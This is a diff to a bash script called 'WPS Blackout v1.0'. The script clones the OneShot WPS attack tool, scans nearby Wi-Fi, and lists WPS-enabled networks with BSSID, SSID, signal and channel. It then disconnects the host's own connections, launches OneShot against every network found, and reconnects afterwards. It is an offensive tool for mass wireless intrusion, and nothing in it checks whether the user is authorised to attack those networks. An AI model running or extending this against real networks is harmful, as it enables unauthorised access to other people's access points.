@@ -13,7 +13,7 @@ req_check(){
         printf "\n\e[0m[\e[92mi\e[0m] OneShot folder found! \n"
     else
         printf "\n\e[0m[\e[91m!\e[0m] OneShot folder not found! \n"
-        git -C $(pwd)/config clone https://github.com/drygdryg/OneShot 
+        git -C $(pwd)/config clone https://github.com/drygdryg/OneShot #clone oneshot repo
         banner
     fi
 }
@@ -23,10 +23,19 @@ banner(){
     printf "<----- WPS Blackout v1.0 ----->\n"
 }
 
+function ifup {
+    if [[ ! -d /sys/class/net/${1} ]]; then
+        # printf 'No such interface: %s\n' "$1" >&2
+        return 1
+    else
+        [[ $(</sys/class/net/${1}/operstate) == up ]]
+    fi
+}
+
 check_ifaces(){
     printf "\n\e[0m[\e[93m*\e[0m] Checking interfaces... \n"
 
-    if sudo ethtool wlan0 2> /dev/null | grep -q "Link detected: yes"; then
+    if ifup wlan0; then
         printf "\n\e[0m[\e[92mi\e[0m] \e[92mwlan0\e[0m is up!\n"
         ip link set wlan0 up
         wlan0_iface=1
@@ -35,7 +44,7 @@ check_ifaces(){
         wlan0_iface=0
     fi
 
-    if sudo ethtool wlan1 2> /dev/null | grep -q "Link detected: yes"; then
+    if ifup wlan1; then
         printf "\e[0m[\e[92mi\e[0m] \e[92mwlan1\e[0m is up!\n"
         ip link set wlan1 up
         wlan1_iface=1
@@ -62,16 +71,26 @@ start_blackout(){
 
     #iq200 sorting wps networks by signal strenght
     awker="$(pwd)/config/wifi.awk"
-    wps_ssid=($(iw dev wlan0 scan duration 15 | awk -f $awker | sort | grep "yes" | awk '{print $2}')) 
+    wps_all=$(iw dev wlan0 scan duration 15 | awk -f $awker | sort)
+    wps_power=($(printf "$wps_all" | grep "yes" | awk '{print $1}'))
+    wps_bssid=($(printf "$wps_all" | grep "yes" | awk '{print $2}'))
+    wps_ssid=($(printf "$wps_all" | grep "yes" | awk '{print $3}'))
+    wps_channel=($(printf "$wps_all" | grep "yes" | awk '{print $5}'))
 
     i=0
     while [ $i -lt ${#wps_ssid[@]} ]
     do
-        printf "\n[$((i+1))] ${wps_ssid[$i]}"
+        printf "\n[\e[92m$((i+1))\e[0m] \e[92m${wps_bssid[$i]} \e[93m${wps_ssid[$i]} \e[94mpwr:${wps_power[$i]} \e[96mchnl:${wps_channel[$i]}\e[0m"
         i=$((i+1))
     done
 
     printf "\n\n\e[0m[\e[92mi\e[0m] Found ${#wps_ssid[@]} WPS networks! \n"
+
+    printf "\n\e[0m[\e[92mi\e[0m] Disconnecting wifi network...\n"
+
+    LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" |  awk '{print $1}' | while read line;
+    do nmcli con down uuid $line &>/dev/null;    
+    done
 
     printf "\n\e[0m[\e[93m*\e[0m] Attacking all networks using OneShot... \n"
 
@@ -102,6 +121,13 @@ start_blackout(){
         y=$((y+1))
     done 
 
+    sleep 5
+
+    printf "\n\e[0m[\e[92mi\e[0m] Backing up wifi network connection...\n\n"
+
+    LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" |  awk '{print $1}' | while read line;
+    do nmcli con up uuid $line &>/dev/null;    
+    done
 }
 
 check_root
